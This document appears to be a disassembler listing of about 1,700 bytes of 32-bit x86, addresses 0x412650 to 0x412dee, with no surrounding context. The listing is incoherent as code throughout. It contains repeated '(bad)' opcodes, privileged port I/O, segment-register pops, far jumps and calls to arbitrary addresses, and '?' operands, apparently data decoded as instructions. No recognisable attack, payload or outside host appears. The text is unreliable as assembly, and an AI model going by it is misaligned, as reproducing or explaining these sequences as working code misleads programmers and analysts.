  412650:	lods   eax,DWORD PTR ds:[esi]
  412651:	cmc    
  412652:	daa    
  412653:	fdivrp st(5),st
  412655:	jno    0x412655
  412657:	jmp    0x41260c
  412659:	pop    ebx
  41265a:	and    eax,0x4fc7b874
  41265f:	aad    0xf1
  412661:	lods   al,BYTE PTR ds:[esi]
  412662:	sahf   
  412663:	(bad)  
  412664:	sbb    dl,BYTE PTR [eax-0x7d]
  412667:	ins    DWORD PTR es:[edi],dx
  412668:	push   0xcdf66d66
  41266d:	stos   DWORD PTR es:[edi],eax
  41266e:	push   es
  41266f:	lock inc esp
  412671:	add    BYTE PTR ds:0xb7dfeaaa,bh
  412677:	scas   eax,DWORD PTR es:[edi]
  412678:	ror    DWORD PTR [ebx-0x73bec13],1
  41267e:	add    al,0xe0
  412680:	sub    eax,DWORD PTR [ecx]
  412682:	out    dx,al
  412683:	mov    ebx,DWORD PTR [ecx+0x5f3d2c6]
  412689:	adc    bh,BYTE PTR [ecx+0x5125e2a]
  41268f:	pop    ss
  412690:	cmc    
  412691:	aam    0x1c
  412693:	int3   
  412694:	push   ebp
  412695:	hlt    
  412696:	cs loopne 0x4126a1
  412699:	enter  0x18f4,0xbe
  41269d:	sar    BYTE PTR [edx+0x7d],1
  4126a0:	mov    ebx,0x152ea581
  4126a5:	push   edx
  4126a6:	dec    edi
  4126a7:	outs   dx,BYTE PTR ds:[esi]
  4126a8:	and    DWORD PTR [edx],eax
  4126aa:	out    0xc3,al
  4126ac:	in     eax,0x4e
  4126ae:	xor    al,0x48
  4126b0:	in     al,0x96
  4126b2:	imul   bl
  4126b4:	stos   DWORD PTR es:[edi],eax
  4126b5:	mov    BYTE PTR [esi+0x4e33577e],al
  4126bb:	xor    ah,dl
  4126bd:	imul   ebp,DWORD PTR [ecx+0x78538b61]
  4126c4:	pop    es
  4126c5:	popa   
  4126c6:	loope  0x4126f7
  4126c8:	cmp    DWORD PTR [edx+0x6de0ae8d],ebp
  4126ce:	ja     0x4126ac
  4126d0:	jnp    0x4126ac
  4126d2:	dec    ebx
  4126d3:	push   edx
  4126d4:	enter  0x1517,0xb6
  4126d8:	push   edi
  4126d9:	add    ebp,DWORD PTR [esi]
  4126db:	enter  0x4c57,0xb
  4126df:	mov    ch,0x92
  4126e1:	push   ss
  4126e2:	mov    fs,WORD PTR [edx]
  4126e4:	push   ebx
  4126e5:	imul   ecx,DWORD PTR [eax+0x1fb785d2],0xffffffa9
  4126ec:	add    al,0xe5
  4126ee:	scas   eax,DWORD PTR es:[edi]
  4126ef:	mov    edi,0xeeb310ff
  4126f4:	sub    al,0xb5
  4126f6:	aaa    
  4126f7:	xchg   esi,eax
  4126f8:	imul   esi
  4126fa:	and    esi,DWORD PTR [edi-0x2e2afebc]
  412700:	(bad)  
  412701:	fsubr  DWORD PTR [ecx-0x120445c0]
  412707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412708:	jnp    0x41270c
  41270a:	pop    eax
  41270b:	icebp  
  41270c:	aaa    
  41270d:	loop   0x412714
  41270f:	or     edi,DWORD PTR [eax+0xf53fdf6]
  412715:	lods   al,BYTE PTR ds:[esi]
  412716:	je     0x4126c6
  412718:	pop    ecx
  412719:	sahf   
  41271a:	mov    eax,0xd338d8e1
  41271f:	cli    
  412720:	pop    edx
  412721:	pop    es
  412722:	ins    DWORD PTR es:[edi],dx
  412723:	fcmovnbe st,st(2)
  412725:	xchg   BYTE PTR [esi-0x6305aa3e],bh
  41272b:	scas   eax,DWORD PTR es:[edi]
  41272c:	push   es
  41272d:	adc    esi,ebx
  41272f:	xchg   ecx,eax
  412730:	mov    ah,0xd3
  412732:	jg     0x4126dd
  412734:	push   edi
  412735:	pop    ebx
  412736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412737:	pop    ds
  412738:	jb     0x412739
  41273a:	popf   
  41273b:	sahf   
  41273c:	and    edi,DWORD PTR [ebp+0x58]
  41273f:	xlat   BYTE PTR ds:[ebx]
  412740:	repnz fldcw WORD PTR [eax+0x70]
  412744:	mov    ch,0x2e
  412746:	rol    DWORD PTR [ecx],cl
  412748:	ret    
  412749:	and    al,0xe2
  41274b:	(bad)  
  41274c:	in     al,0xb7
  41274e:	pop    ss
  41274f:	jmp    0xf7db:0x28619739
  412756:	inc    esp
  412757:	inc    ebx
  412758:	mov    esi,0x924f21cc
  41275d:	ds dec eax
  41275f:	mov    dh,0x65
  412761:	jmp    0x412771
  412763:	int    0x83
  412765:	mov    DWORD PTR [esi+0x47],ecx
  412768:	inc    edx
  412769:	xor    eax,0xa6d195df
  41276e:	pusha  
  41276f:	jl     0x4127ea
  412771:	loope  0x41274c
  412773:	push   edx
  412774:	jnp    0x4127d6
  412776:	mov    esp,0xfc5d4a5d
  41277b:	jne    0x412789
  41277d:	icebp  
  41277e:	iret   
  41277f:	call   0xc12d9073
  412784:	dec    DWORD PTR [ebx]
  412786:	(bad)  
  412787:	je     0x412711
  412789:	add    al,0x77
  41278b:	adc    edi,DWORD PTR [esi]
  41278d:	hlt    
  41278e:	lahf   
  41278f:	cmc    
  412790:	dec    eax
  412791:	in     eax,0x4c
  412793:	loop   0x412806
  412795:	iret   
  412796:	adc    ah,BYTE PTR [edx-0x66315086]
  41279c:	and    BYTE PTR [edi-0x46],cl
  41279f:	sbb    eax,0x1a6254a3
  4127a4:	push   0xef37a6e9
  4127a9:	loopne 0x4127cf
  4127ab:	enter  0x572b,0x2d
  4127af:	cmp    eax,0x49c76e78
  4127b4:	in     eax,dx
  4127b5:	aam    0xfd
  4127b7:	mov    dh,0xf7
  4127b9:	mov    ds:0x476ba06f,eax
  4127be:	jns    0x412756
  4127c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c1:	jmp    0x412762
  4127c3:	mov    WORD PTR [eax],?
  4127c5:	loopne 0x4127b9
  4127c7:	sahf   
  4127c8:	adc    ah,BYTE PTR [ecx]
  4127ca:	mov    ah,BYTE PTR [edx]
  4127cc:	xchg   dl,dl
  4127ce:	add    DWORD PTR [eax],edi
  4127d0:	xchg   ecx,eax
  4127d1:	rcl    dl,cl
  4127d3:	popf   
  4127d4:	lds    ebp,FWORD PTR [edx]
  4127d6:	mov    ds:0x69a7130d,al
  4127db:	pop    ebp
  4127dc:	mov    esi,0x1a089859
  4127e1:	fldenv [edi]
  4127e3:	rcl    al,1
  4127e5:	jb     0x4127f8
  4127e7:	add    BYTE PTR [eax+eiz*1-0x4b16ccbe],ch
  4127ee:	cmp    al,0x16
  4127f0:	mov    ch,0x53
  4127f2:	cld    
  4127f3:	lds    esi,FWORD PTR [ebx-0x50ba8b69]
  4127f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127fa:	and    dh,BYTE PTR ds:0xd2f6ea53
  412800:	sub    BYTE PTR [ebx],0xde
  412803:	adc    esp,DWORD PTR [esi-0x5f390630]
  412809:	ret    
  41280a:	cld    
  41280b:	rcl    ecx,cl
  41280d:	lock mov ds:0x38cf6911,eax
  412813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412814:	ins    DWORD PTR es:[edi],dx
  412815:	push   es
  412816:	inc    ebx
  412817:	xor    esi,DWORD PTR [eax-0x1]
  41281a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281b:	ficomp DWORD PTR [ebp-0x42]
  41281e:	push   esp
  41281f:	imul   esi,esp,0x6d
  412822:	in     eax,dx
  412823:	pop    ss
  412824:	lea    ebp,[eax+ebp*8+0x56]
  412828:	jmp    0xa55fabb4
  41282d:	jp     0x412865
  41282f:	xor    dl,BYTE PTR [edx+0x34]
  412832:	mov    ah,0xea
  412834:	scas   al,BYTE PTR es:[edi]
  412835:	mov    esi,0xf0c78c1
  41283a:	icebp  
  41283b:	aam    0x5c
  41283d:	fcomp  QWORD PTR [eax+edx*8+0x29824025]
  412844:	and    esi,esp
  412846:	arpl   WORD PTR [ecx-0xf5c04f4],di
  41284c:	std    
  41284d:	add    BYTE PTR [ebx],bh
  41284f:	js     0x41288b
  412851:	mov    WORD PTR [ebx],gs
  412853:	sub    BYTE PTR [edx-0x18],ah
  412856:	jg     0x4128c9
  412858:	and    ch,BYTE PTR [esi]
  41285a:	mov    dl,0x8a
  41285c:	shl    ch,0x5e
  41285f:	jp     0x412870
  412861:	xor    dh,BYTE PTR [ebx]
  412863:	imul   ebp,edi,0x3a525748
  412869:	adc    eax,0x6f6dfacd
  41286e:	stc    
  41286f:	bound  ebx,QWORD PTR [ebx-0x65]
  412872:	ins    BYTE PTR es:[edi],dx
  412873:	mov    eax,0x46153b3b
  412878:	pop    ebx
  412879:	repz arpl ax,ax
  41287c:	fwait
  41287d:	xor    ebx,edi
  41287f:	(bad)  
  412880:	sbb    DWORD PTR [ecx+0x4c],0x8b4f3ff5
  412887:	cli    
  412888:	out    0x72,eax
  41288a:	fucomi st,st(0)
  41288c:	cmc    
  41288d:	adc    bl,BYTE PTR ss:[esi]
  412890:	jne    0x412838
  412892:	fisub  DWORD PTR [ebp+0x58]
  412895:	push   eax
  412896:	add    BYTE PTR ds:0x36566429,ch
  41289c:	fnsave [ebx]
  41289e:	sbb    al,0x57
  4128a0:	sbb    cl,cl
  4128a2:	or     al,0xc5
  4128a4:	mov    ds:0x3508f6e2,eax
  4128a9:	xchg   edi,eax
  4128aa:	or     ecx,edx
  4128ac:	and    BYTE PTR [edi+0x23fed7ac],0x9b
  4128b3:	sub    DWORD PTR [ecx-0x32d79293],edx
  4128b9:	pop    DWORD PTR [edi]
  4128bb:	pop    esi
  4128bc:	and    dl,BYTE PTR [edx+0x72d354d5]
  4128c2:	cmc    
  4128c3:	inc    edx
  4128c4:	sub    dh,al
  4128c6:	mov    DWORD PTR [edi+0x1b],ecx
  4128c9:	loope  0x4128d7
  4128cb:	ins    BYTE PTR es:[edi],dx
  4128cc:	mov    bl,0x54
  4128ce:	jl     0x4128bf
  4128d0:	add    edx,DWORD PTR ds:0x3063fb34
  4128d6:	add    eax,0xb350bb06
  4128db:	sub    al,0xa3
  4128dd:	ja     0x41294f
  4128df:	cmp    BYTE PTR [esi+0x67],bh
  4128e2:	aas    
  4128e3:	sbb    esi,DWORD PTR ds:0xd159d5f3
  4128e9:	sbb    eax,0xedde26e7
  4128ee:	jl     0x4128a0
  4128f0:	inc    ebx
  4128f1:	retf   
  4128f2:	lock adc al,0x22
  4128f5:	addr16 repz pop edx
  4128f8:	xor    BYTE PTR [eax-0x70],0xba
  4128fc:	push   edx
  4128fd:	mov    esp,0x7867a6c3
  412902:	xchg   ecx,eax
  412903:	aad    0x2
  412905:	add    DWORD PTR es:[ebp+0x1e59fc41],edx
  41290c:	jnp    0x412938
  41290e:	popa   
  41290f:	add    ebp,DWORD PTR [edi+ebx*1+0x622c55ea]
  412916:	or     DWORD PTR [ebx-0x3c241017],esi
  41291c:	dec    esp
  41291d:	adc    eax,0x71a221e0
  412922:	mov    ebp,0x393a3a8e
  412927:	inc    DWORD PTR [edx]
  412929:	push   esp
  41292a:	loop   0x4128fa
  41292c:	in     eax,dx
  41292d:	ss fs call 0x62d0492
  412934:	das    
  412935:	or     dl,BYTE PTR [esi-0x4d541f77]
  41293b:	or     dl,bh
  41293d:	pop    ecx
  41293e:	icebp  
  41293f:	sbb    edi,edi
  412941:	(bad)  
  412942:	leave  
  412943:	aas    
  412944:	adc    cl,BYTE PTR [eax+0x14236481]
  41294a:	test   BYTE PTR [edi-0x63],dh
  41294d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41294e:	xchg   edi,edx
  412950:	jmp    0x412934
  412952:	(bad)  
  412953:	nop
  412954:	cli    
  412955:	lock mov bl,al
  412958:	sahf   
  412959:	push   edi
  41295a:	add    esi,DWORD PTR [ebp+0x2b]
  41295d:	jne    0x412949
  41295f:	mov    BYTE PTR [esi-0x2e],al
  412962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412963:	dec    ecx
  412964:	imul   ebx,DWORD PTR ds:0xf108eb5a,0xb93dc466
  41296e:	out    0xe3,eax
  412970:	sbb    BYTE PTR [esi+0x42a799cb],bl
  412976:	loop   0x4129c7
  412978:	outs   dx,DWORD PTR ds:[esi]
  412979:	enter  0xccce,0xbf
  41297d:	xor    dl,BYTE PTR [edi]
  41297f:	mov    ecx,0xaf3bb8d1
  412984:	out    dx,al
  412985:	xchg   esp,eax
  412986:	mov    ebp,0x3ef3ef76
  41298b:	ins    DWORD PTR es:[edi],dx
  41298c:	mov    edx,0x2eb5ce0a
  412991:	push   esi
  412992:	les    eax,FWORD PTR [edi-0x74]
  412995:	(bad)  
  412997:	xchg   BYTE PTR fs:[ebx-0x7d11efd4],ah
  41299e:	adc    dl,BYTE PTR [esi-0x2f]
  4129a1:	pop    ss
  4129a2:	ret    
  4129a3:	adc    BYTE PTR ds:0xd84aa649,ah
  4129a9:	daa    
  4129aa:	(bad)  
  4129ab:	pop    ss
  4129ac:	inc    eax
  4129ad:	pop    edi
  4129ae:	jae    0x4129f8
  4129b0:	leave  
  4129b1:	and    edi,edx
  4129b3:	cdq    
  4129b4:	in     eax,0xc6
  4129b6:	xor    esp,0x5
  4129b9:	ror    DWORD PTR [ebx-0x3f],0xf0
  4129bd:	jl     0x412997
  4129bf:	mov    ecx,0xd2f420c4
  4129c4:	fbld   TBYTE PTR [edx+0x58]
  4129c7:	fild   WORD PTR [esp+eax*1]
  4129ca:	inc    eax
  4129cb:	pop    ds
  4129cc:	leave  
  4129cd:	or     DWORD PTR [esi-0x58d60b6],esp
  4129d3:	dec    edx
  4129d4:	fsub   DWORD PTR [ebx+edi*8-0x4bdf3400]
  4129db:	je     0x412a3c
  4129dd:	scas   eax,DWORD PTR es:[edi]
  4129de:	push   esi
  4129df:	dec    edi
  4129e0:	scas   eax,DWORD PTR es:[edi]
  4129e1:	add    al,0xc9
  4129e3:	ins    BYTE PTR es:[edi],dx
  4129e4:	cmp    al,BYTE PTR [ecx-0x48]
  4129e7:	inc    edx
  4129e8:	mov    DWORD PTR [ebp-0x544925de],edx
  4129ee:	sbb    DWORD PTR [ecx],0x2063984e
  4129f4:	ror    DWORD PTR [edi-0x8],1
  4129f7:	cmp    dh,BYTE PTR [ebx-0x3772010d]
  4129fd:	and    esi,esi
  4129ff:	xchg   edi,eax
  412a00:	ror    BYTE PTR [ebp-0xd],0x7c
  412a04:	rcr    al,0xaf
  412a07:	fnop   
  412a09:	cmp    al,0x53
  412a0b:	or     eax,0xf3f02d5d
  412a10:	sbb    al,0xfe
  412a12:	push   esp
  412a13:	fcomp  QWORD PTR [ebx+0x4f03347b]
  412a19:	adc    al,0x4
  412a1b:	sbb    dl,bh
  412a1d:	jmp    0x848a:0xbe86417c
  412a24:	mov    edi,0x2ed62a00
  412a29:	dec    eax
  412a2a:	fwait
  412a2b:	std    
  412a2c:	jge    0x412a3f
  412a2e:	add    BYTE PTR [ebx],al
  412a30:	test   BYTE PTR [edx+eiz*1-0x63ef025f],ah
  412a37:	fnstenv [edx]
  412a39:	ret    0x32b1
  412a3c:	arpl   di,dx
  412a3e:	sbb    bl,BYTE PTR [esi]
  412a40:	jnp    0x412a16
  412a42:	sbb    BYTE PTR [edx],bl
  412a44:	jl     0x412ac5
  412a46:	xchg   ecx,eax
  412a47:	sub    bh,BYTE PTR [ebp+0x4ddc90a0]
  412a4d:	jns    0x412a2f
  412a4f:	xchg   esp,eax
  412a50:	jo     0x4129f4
  412a52:	dec    esp
  412a53:	mov    bh,0x1e
  412a55:	push   edx
  412a56:	arpl   di,bx
  412a58:	lods   eax,DWORD PTR ds:[esi]
  412a59:	or     eax,edi
  412a5b:	mov    esp,0x25658623
  412a60:	ja     0x412a2e
  412a62:	pop    ds
  412a63:	(bad)
  412a66:	pop    ebp
  412a67:	sti    
  412a68:	lds    ebp,FWORD PTR [eax]
  412a6a:	ret    0x77a8
  412a6d:	loope  0x412ad1
  412a6f:	or     ecx,esi
  412a71:	and    eax,0x8ae705c9
  412a76:	shr    DWORD PTR [edx],1
  412a78:	mov    eax,ds:0xda01cb2b
  412a7d:	cli    
  412a7e:	adc    DWORD PTR [ecx],ebx
  412a80:	ss mov ch,0x6d
  412a83:	and    BYTE PTR [eax-0x586b8755],cl
  412a89:	adc    al,0x48
  412a8b:	(bad)  
  412a8d:	ret    0x60c5
  412a90:	inc    ebp
  412a91:	das    
  412a92:	sti    
  412a93:	and    bh,BYTE PTR [ebx]
  412a95:	mov    ch,bl
  412a97:	in     eax,dx
  412a98:	mov    edi,DWORD PTR [edx]
  412a9a:	mov    ch,0x77
  412a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9d:	add    dl,dl
  412a9f:	out    0x78,al
  412aa1:	and    eax,DWORD PTR [ecx-0x52bc1b1f]
  412aa7:	jge    0x412a8e
  412aa9:	aas    
  412aaa:	shr    BYTE PTR [eax+0x6c],1
  412aad:	not    BYTE PTR [edi-0x16]
  412ab0:	xchg   DWORD PTR [edx+0x5a66b649],ebp
  412ab6:	nop
  412ab7:	mov    ecx,0xc572b2be
  412abc:	pop    edi
  412abd:	pop    ss
  412abe:	jge    0x412af9
  412ac0:	jecxz  0x412b38
  412ac2:	outs   dx,DWORD PTR ds:[esi]
  412ac3:	mov    bl,0x9
  412ac5:	outs   dx,DWORD PTR ds:[esi]
  412ac6:	test   DWORD PTR [ebx+0x49],0x41a5117f
  412acd:	jl     0x412ad6
  412acf:	sub    DWORD PTR [ebx-0x5a],esi
  412ad2:	jne    0x412abc
  412ad4:	pusha  
  412ad5:	retf   
  412ad6:	or     BYTE PTR ds:0x21fdfe24,bh
  412adc:	aaa    
  412add:	iret   
  412ade:	(bad)  
  412adf:	sub    DWORD PTR [edi+0x42e46621],ebp
  412ae5:	ins    BYTE PTR es:[edi],dx
  412ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ae7:	inc    ebx
  412ae8:	jbe    0x412ac7
  412aea:	retf   
  412aeb:	cmp    ch,0xa8
  412aee:	jl     0x412ace
  412af0:	mov    eax,DWORD PTR [ebx-0x416e393d]
  412af6:	xchg   esi,eax
  412af7:	jmp    0x412b1d
  412af9:	sbb    BYTE PTR [esi],al
  412afb:	cdq    
  412afc:	test   DWORD PTR [ecx-0x4342ba61],eax
  412b02:	push   edx
  412b03:	adc    al,0x39
  412b05:	nop
  412b06:	or     DWORD PTR [esp+esi*4],ebp
  412b09:	push   esp
  412b0a:	and    al,0xa7
  412b0d:	mov    bl,0xb0
  412b0f:	mov    BYTE PTR [ebx],bh
  412b11:	rol    DWORD PTR [ebp-0x7e],1
  412b14:	push   esi
  412b15:	int    0xb9
  412b17:	mov    BYTE PTR [esi-0x39],cl
  412b1a:	mov    eax,0x83a31735
  412b1f:	rcr    DWORD PTR [esi],0x4d
  412b22:	xchg   edi,eax
  412b23:	mov    WORD PTR [esi-0x70],?
  412b26:	inc    ebx
  412b27:	pop    ecx
  412b28:	stc    
  412b29:	aam    0xb2
  412b2b:	std    
  412b2c:	and    BYTE PTR [ecx+eiz*2+0x54],cl
  412b30:	dec    eax
  412b31:	test   al,0x27
  412b33:	push   ebx
  412b34:	stc    
  412b35:	xor    DWORD PTR [eax+0x0],eax
  412b38:	pop    ss
  412b39:	mov    bl,0xa7
  412b3b:	fs sub al,0x96
  412b3e:	scas   eax,DWORD PTR es:[edi]
  412b3f:	iret   
  412b40:	call   0xd157544f
  412b45:	aad    0xa6
  412b47:	leave  
  412b48:	jb     0x412b6a
  412b4a:	xor    BYTE PTR [ecx-0x6a],0x37
  412b4e:	(bad)  
  412b4f:	aaa    
  412b50:	push   ds
  412b51:	push   eax
  412b52:	rcl    BYTE PTR [edi],cl
  412b54:	out    dx,eax
  412b55:	shr    dh,0xfc
  412b58:	mov    WORD PTR ds:0x2020af1f,fs
  412b5e:	or     BYTE PTR [eax-0x54],ch
  412b61:	xlat   BYTE PTR ds:[ebx]
  412b62:	inc    ebp
  412b63:	in     eax,0xcb
  412b65:	add    eax,DWORD PTR [esi]
  412b67:	push   es
  412b68:	jae    0x412b04
  412b6a:	pop    esi
  412b6b:	mov    ebx,0x4179ca9c
  412b70:	jbe    0x412b8f
  412b72:	mov    edi,0xdc1618bc
  412b77:	lock fcmovb st,st(5)
  412b7a:	mov    eax,ds:0xefdea2ba
  412b7f:	mov    al,0x8c
  412b81:	leave  
  412b82:	fwait
  412b83:	sub    eax,0x79212a90
  412b88:	shr    DWORD PTR [ebx+0x9],1
  412b8b:	mov    esi,0x28ce133e
  412b90:	xor    DWORD PTR [ebx],eax
  412b92:	loopne 0x412b82
  412b94:	sbb    al,0xa7
  412b96:	cmp    al,0xc
  412b98:	xchg   esi,eax
  412b99:	imul   ebx,DWORD PTR [esi+eax*4],0xfffffff5
  412b9d:	mov    al,BYTE PTR [eax+0x7b]
  412ba0:	fiadd  WORD PTR [esi-0x53d06fc3]
  412ba6:	les    edi,FWORD PTR [ebx+0x3a]
  412ba9:	(bad)  
  412baa:	dec    eax
  412bab:	rol    dh,0xb0
  412bae:	sbb    DWORD PTR [eax-0x4f488c38],edi
  412bb4:	mov    esp,0x47600a47
  412bb9:	les    ecx,FWORD PTR [eax+0x36b80645]
  412bbf:	mov    ds:0x3a83bc81,eax
  412bc4:	jb     0x412b84
  412bc6:	jl     0x412b96
  412bc8:	inc    ebp
  412bc9:	cmp    eax,0xa73a372c
  412bce:	in     al,dx
  412bcf:	jmp    0x412c4b
  412bd1:	dec    edx
  412bd2:	pop    edx
  412bd3:	add    eax,0xca72ba7c
  412bd8:	fadd   QWORD PTR [esi]
  412bda:	les    edx,FWORD PTR ds:0xcf4b55c3
  412be0:	pushf  
  412be1:	mov    esi,0x33b1ca48
  412be6:	fs mov ebx,0x9a5dc4db
  412bec:	inc    edi
  412bed:	fld    st(1)
  412bef:	(bad)  
  412bf0:	pop    ds
  412bf1:	outs   dx,DWORD PTR ds:[esi]
  412bf2:	sub    BYTE PTR [ebp+0x2d44073f],dh
  412bf8:	xor    DWORD PTR [ecx],edi
  412bfa:	scas   eax,DWORD PTR es:[edi]
  412bfb:	dec    esp
  412bfc:	push   ss
  412bfd:	shl    DWORD PTR [ebx+eiz*2],0xc1
  412c01:	add    DWORD PTR [eax],ecx
  412c03:	jnp    0x412bd0
  412c05:	ss loope 0x412be9
  412c08:	jns    0x412c43
  412c0a:	jae    0x412c64
  412c0c:	cmp    esi,DWORD PTR [ecx-0x71]
  412c0f:	adc    DWORD PTR [ebx-0x60],edx
  412c12:	inc    edi
  412c13:	inc    edx
  412c14:	xor    BYTE PTR [esi+esi*2],dh
  412c17:	jl     0x412bf6
  412c19:	cmc    
  412c1a:	pop    ss
  412c1b:	sub    al,0x76
  412c1d:	xlat   BYTE PTR ds:[ebx]
  412c1e:	pop    edi
  412c1f:	sbb    DWORD PTR [ebx+ebx*4],0xce1c4ad5
  412c26:	dec    edi
  412c27:	lods   al,BYTE PTR ds:[esi]
  412c28:	pop    ecx
  412c29:	inc    esp
  412c2a:	pop    edx
  412c2b:	gs inc edx
  412c2d:	mov    cl,0x6f
  412c2f:	add    eax,0xf89a18dd
  412c34:	adc    al,0xce
  412c36:	push   ds
  412c37:	call   0x2c961840
  412c3c:	mov    dh,0x7d
  412c3e:	das    
  412c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c40:	push   ebx
  412c41:	es ret 0x12e8
  412c45:	and    esp,ecx
  412c47:	xor    BYTE PTR [eax],0x9f
  412c4a:	ds and eax,0x78a18aa2
  412c50:	adc    eax,0x60b43e24
  412c55:	call   0xb435f53c
  412c5a:	mov    edi,0xcbd101c1
  412c5f:	dec    edx
  412c60:	pop    es
  412c61:	mov    ecx,0xa8efd277
  412c66:	or     BYTE PTR [edi+0x45],cl
  412c69:	pop    ss
  412c6a:	in     eax,dx
  412c6b:	add    DWORD PTR [edx-0x44],ebx
  412c6e:	xor    bl,BYTE PTR [ebp-0x386bad66]
  412c74:	sub    BYTE PTR [edi+eax*2],bh
  412c77:	int3   
  412c78:	dec    edi
  412c79:	mov    al,ds:0xf3227f52
  412c7e:	xor    DWORD PTR [eax-0x7bf34b9b],0xffffffd4
  412c85:	or     ch,ch
  412c87:	in     eax,0x12
  412c89:	push   0x96a443d5
  412c8e:	sub    BYTE PTR [edi],dl
  412c90:	popw   es
  412c92:	sbb    BYTE PTR [ecx+0x2bd4cd58],0xa9
  412c99:	add    DWORD PTR [ecx-0x2cdff1ee],eax
  412c9f:	push   es
  412ca0:	push   ebp
  412ca1:	mov    edx,0x2faf287f
  412ca6:	je     0x412cac
  412ca8:	mov    ebx,0xb631cbcc
  412cad:	push   eax
  412cae:	(bad)  
  412caf:	dec    edx
  412cb0:	into   
  412cb1:	daa    
  412cb2:	ds (bad) 
  412cb5:	pop    ds
  412cb6:	add    al,0xb0
  412cb8:	jne    0x412cb1
  412cba:	cdq    
  412cbb:	xchg   esp,eax
  412cbc:	scas   ax,WORD PTR es:[edi]
  412cbe:	xchg   ecx,eax
  412cbf:	stos   DWORD PTR es:[edi],eax
  412cc0:	leave  
  412cc1:	mov    ah,0xff
  412cc3:	cmp    DWORD PTR [eax],edi
  412cc5:	adc    al,BYTE PTR fs:[esi-0x1d]
  412cc9:	in     al,dx
  412cca:	mov    bl,0xf5
  412ccc:	mov    bl,0x0
  412cce:	lock jnp 0x412d11
  412cd1:	gs cmp eax,0xafecf300
  412cd7:	push   ecx
  412cd8:	scas   eax,DWORD PTR es:[edi]
  412cd9:	outs   dx,BYTE PTR ds:[esi]
  412cda:	pushf  
  412cdb:	sti    
  412cdc:	adc    eax,0x6571331d
  412ce1:	jo     0x412d13
  412ce3:	push   edi
  412ce4:	xchg   ecx,eax
  412ce5:	pop    eax
  412ce6:	or     esi,DWORD PTR ss:[ebx-0x1737c14b]
  412ced:	sbb    eax,0x17164c37
  412cf2:	in     al,dx
  412cf3:	cdq    
  412cf4:	xchg   ecx,eax
  412cf5:	sti    
  412cf6:	sbb    al,0xa9
  412cf8:	ja     0x412d08
  412cfa:	mov    esp,0x14e2c515
  412cff:	ficomp DWORD PTR [ebp+0x60]
  412d02:	or     esi,DWORD PTR [eax+edx*4+0x1483001e]
  412d09:	adc    BYTE PTR [eax],bh
  412d0b:	push   edi
  412d0c:	ds std 
  412d0e:	fs push esp
  412d10:	jnp    0x412d8f
  412d12:	loop   0x412d1b
  412d14:	(bad)  
  412d15:	add    eax,0x4f21c0dc
  412d1a:	test   al,0x25
  412d1c:	jl     0x412d8e
  412d1e:	sub    DWORD PTR [esi+edi*4+0x2a],ebp
  412d22:	mov    dh,0x94
  412d24:	cmp    al,0x3
  412d26:	sbb    cl,ah
  412d28:	loopne 0x412cf7
  412d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d2b:	jns    0x412d4e
  412d2d:	in     al,0x1
  412d2f:	push   cs
  412d30:	cmp    ch,BYTE PTR ss:[ecx]
  412d33:	push   ss
  412d34:	ins    DWORD PTR es:[edi],dx
  412d35:	mov    ebx,0x696d093c
  412d3a:	shr    DWORD PTR [edx+0x16dbbd75],cl
  412d40:	push   0x91f2a63a
  412d45:	jns    0x412ceb
  412d47:	cmc    
  412d48:	repnz mov ds:0x358cd9ac,al
  412d4e:	jmp    0x4be97fe1
  412d53:	aad    0x7e
  412d55:	jmp    0x412d4c
  412d57:	jg     0x412d91
  412d59:	mov    BYTE PTR [edx-0x24],dh
  412d5c:	dec    ebx
  412d5d:	pop    edx
  412d5e:	add    DWORD PTR [edx+ebp*1-0x4c65cc29],ebp
  412d65:	jecxz  0x412cfa
  412d67:	in     eax,0x65
  412d69:	lods   eax,DWORD PTR ds:[esi]
  412d6a:	lods   al,BYTE PTR ds:[esi]
  412d6b:	outs   dx,DWORD PTR ds:[esi]
  412d6c:	xlat   BYTE PTR ds:[ebx]
  412d6d:	jg     0x412d63
  412d6f:	jmp    0xf8d8:0x545e5e89
  412d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d77:	mov    bh,dl
  412d79:	mov    bl,0x8f
  412d7b:	cmc    
  412d7c:	and    esi,DWORD PTR [eax]
  412d7e:	mov    esi,0xf7a839da
  412d83:	mov    edx,DWORD PTR [ecx]
  412d85:	jp     0x412d6f
  412d87:	or     BYTE PTR [edi-0x3c849147],bh
  412d8d:	cmp    dl,BYTE PTR [ebp-0x4101e8b6]
  412d93:	or     edi,DWORD PTR [ecx+ebx*2-0x6b09c15c]
  412d9a:	popf   
  412d9b:	mov    ecx,0x5deed676
  412da0:	dec    edx
  412da1:	pop    eax
  412da2:	in     al,0xb6
  412da4:	xchg   edi,eax
  412da5:	mov    DWORD PTR [edx-0x2ef8c93c],edx
  412dab:	adc    BYTE PTR [ebp+eiz*1+0x19f4e192],0x88
  412db3:	outs   dx,BYTE PTR ds:[esi]
  412db4:	test   eax,0x145140a5
  412db9:	das    
  412dba:	adc    esi,edx
  412dbc:	pop    es
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	in     al,dx
  412dbf:	out    0xc6,eax
  412dc1:	mov    dl,0xdb
  412dc3:	and    DWORD PTR ds:[edi],esp
  412dc6:	nop
  412dc7:	xlat   BYTE PTR ds:[ebx]
  412dc8:	cmp    BYTE PTR [edi],0xc4
  412dcb:	test   eax,0x602b10bf
  412dd0:	fs mov al,0x17
  412dd3:	(bad)  
  412dd4:	dec    esi
  412dd5:	push   eax
  412dd6:	push   cs
  412dd7:	xchg   ecx,eax
  412dd8:	ret    0x5817
  412ddb:	and    al,0x9a
  412ddd:	cmp    ecx,esp
  412ddf:	test   DWORD PTR [ebx+0x175f7a29],eax
  412de5:	mov    ecx,0x5d4c18a6
  412dea:	xor    edi,DWORD PTR [ebx]
  412dec:	aad    0xae
  412dee:	adc    al,0x33
